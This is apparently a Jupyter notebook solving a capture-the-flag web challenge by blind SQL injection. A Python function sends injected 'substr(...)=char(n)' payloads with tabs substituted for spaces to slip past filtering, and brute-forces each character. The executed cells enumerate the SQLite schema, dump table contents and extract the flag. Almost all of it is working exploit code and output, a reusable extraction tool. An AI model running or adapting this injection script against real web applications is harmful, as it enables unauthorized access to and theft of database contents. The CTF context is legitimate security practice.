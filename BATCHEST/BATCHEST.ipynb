{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "af9ee636",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from tqdm.auto import tqdm\n",
    "import string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "c1542b16",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'https://blindsqli-web.chall.cryptonite.team/'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "b7bd3f6f",
   "metadata": {},
   "outputs": [],
   "source": [
    "def _execAnyQuery_core(q, pos, mid):\n",
    "    \"\"\"\n",
    "    queryの実行結果のpos文字目がmidかどうかを判定する。\n",
    "    \"\"\"\n",
    "    query = \"lion' and substr(({0}),{1},1)=char({2}) ; -- \".format(q, pos, mid)\n",
    "    \n",
    "    data = {\n",
    "      'query': query.replace(\" \", \"\\t\"),\n",
    "      'sub': 'SUBMIT'\n",
    "    }\n",
    "    \n",
    "    \n",
    "    while True:\n",
    "        page = requests.post(url, data=data)\n",
    "        if page.status_code==500:\n",
    "            print(\"Warning ! Error 500\")\n",
    "        if page.status_code==200:\n",
    "            return \"Hell yeah\" in page.text \n",
    "\n",
    "\n",
    "def _execAnyQuery(query, pos):\n",
    "    for c in string.printable:\n",
    "        if _execAnyQuery_core(query, pos,ord(c)):\n",
    "            return ord(c)\n",
    "    return 0\n",
    "        \n",
    "def execAnyQuery(query):\n",
    "    i = 1\n",
    "    while True:\n",
    "        char = int(_execAnyQuery(query, i))\n",
    "        if char==0:\n",
    "            return\n",
    "        print(chr(char), end=\"\")\n",
    "        i += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "480b0f67",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "abc\n",
      "CPU times: user 1.57 s, sys: 156 ms, total: 1.72 s\n",
      "Wall time: 38.1 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"select 'abc'\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "afe87b17",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n",
      "CPU times: user 1.25 s, sys: 127 ms, total: 1.37 s\n",
      "Wall time: 53.7 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT 1 from SQLITE_MASTER\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "0d65de9e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CREATE TABLE \"Facts\" (\n",
      "\t\"Id\"\tINTEGER UNIQUE,\n",
      "\t\"Info\"\tTEXT,\n",
      "\tPRIMARY KEY(\"Id\" AUTOINCREMENT)\n",
      ")\n",
      "CPU times: user 1min 2s, sys: 6.28 s, total: 1min 9s\n",
      "Wall time: 32min 50s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT sql from SQLITE_MASTER\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "441c4ef1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Cats are perfect\n",
      "CPU times: user 7.12 s, sys: 721 ms, total: 7.84 s\n",
      "Wall time: 4min 59s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT Info from Facts limit 1 offset 0\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "bce30c58",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Dogs are good too\n",
      "CPU times: user 8.48 s, sys: 855 ms, total: 9.34 s\n",
      "Wall time: 3min 15s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT Info from Facts limit 1 offset 1\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "5d4d8683",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Something like this\n",
      "CPU times: user 8.07 s, sys: 806 ms, total: 8.88 s\n",
      "Wall time: 4min 9s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT Info from Facts limit 1 offset 2\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "534a5f69",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Cats are like roommates\n",
      "CPU times: user 9.92 s, sys: 1.02 s, total: 10.9 s\n",
      "Wall time: 14min 28s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT Info from Facts limit 1 offset 3\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "0772a5a7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "CPU times: user 1.14 s, sys: 115 ms, total: 1.25 s\n",
      "Wall time: 1min 22s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT Info from Facts limit 1 offset 4\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "fdb71b83",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "CPU times: user 1.15 s, sys: 115 ms, total: 1.26 s\n",
      "Wall time: 42.4 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT Info from Facts limit 1 offset 5\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "9d07e3ca",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "CPU times: user 1.23 s, sys: 126 ms, total: 1.35 s\n",
      "Wall time: 1min 29s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT sql from SQLITE_MASTER limit 1 offset 1\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "65b8a83b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CREATE TABLE sqlite_sequence(name,seq)\n",
      "CPU times: user 17.9 s, sys: 1.79 s, total: 19.7 s\n",
      "Wall time: 7min 30s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT sql from SQLITE_MASTER limit 1 offset 2\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "22a278cc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CREATE TABLE \"Flag_tbl\" (\n",
      "\t\"flag_cln\"\tTEXT NOT NULL UNIQUE,\n",
      "\tPRIMARY KEY(\"flag_cln\")\n",
      ")\n",
      "CPU times: user 1min 39s, sys: 9.34 s, total: 1min 48s\n",
      "Wall time: 34min 13s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT sql from SQLITE_MASTER limit 1 offset 3\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "e790196f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "CPU times: user 2.14 s, sys: 204 ms, total: 2.34 s\n",
      "Wall time: 28.2 s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT sql from SQLITE_MASTER limit 1 offset 4\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "85530cb9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "nite{THIS_IS_WORKING}\n",
      "CPU times: user 23.9 s, sys: 2.27 s, total: 26.1 s\n",
      "Wall time: 36min 31s\n"
     ]
    }
   ],
   "source": [
    "%%time\n",
    "execAnyQuery(\"SELECT flag_cln from Flag_tbl limit 1 offset 0\")\n",
    "print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4412bd14",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
